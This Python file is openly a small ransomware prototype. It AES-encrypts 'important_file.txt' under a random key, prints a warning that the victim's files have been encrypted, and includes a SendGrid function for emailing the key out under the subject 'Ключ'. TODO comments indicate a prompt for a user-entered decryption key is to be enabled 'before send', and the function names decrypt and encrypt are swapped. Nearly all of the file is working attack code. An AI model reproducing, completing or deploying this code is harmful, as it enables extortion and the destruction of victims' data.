import base64
import os
from base64 import b64encode
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Random import get_random_bytes
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


def send_email(key):
    message = Mail(
        from_email='',
        to_emails='',
        subject='Ключ',
        html_content=key
    )
    sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
    response = sg.send(message)


def decrypt():
    key = get_random_bytes(16)
    b64_key = base64.b64encode(key).decode()
    ransomware_path = os.path.realpath(__file__)
    file_path = 'important_file.txt'
    if file_path != ransomware_path:
        file = open(file_path, "rb")
        data = file.read()
        file.close()
        file = open(file_path, "wb")
        cipher = AES.new(key, AES.MODE_OFB)
        encr = cipher.encrypt(data)
        iv = b64encode(cipher.iv).decode('utf-8')
        e_data = cipher.iv
        e_data += encr
        file.write(e_data)
        file.close()
    print("Warning!")
    print(f"Your files in {file_path} and it's subfolders have been encrypted!")
    return b64_key, iv


def encrypt(key, iv):
    # ui_key = input("Enter a key to decrypt all of the files:")
    # TODO: uncomment before send
    dkey = base64.b64decode(key)
    # TODO: change key by ui_key after uncomment
    ransomware_path = os.path.realpath(__file__)
    file_path = 'important_file.txt'
    if file_path != ransomware_path:
        file = open(file_path, "rb")
        e_data = file.read()
        file.close()
        file = open(file_path, "wb")
        iv = b64decode(iv)
        d_cipher = AES.new(dkey, AES.MODE_OFB, iv=iv)
        decr = d_cipher.decrypt(e_data)
        file.write(decr)
        file.close()
    print(f"Your files in {file_path} and it's subfolders have been decrypted!")


def main():
    key, iv = decrypt()
    encrypt(key, iv)


main()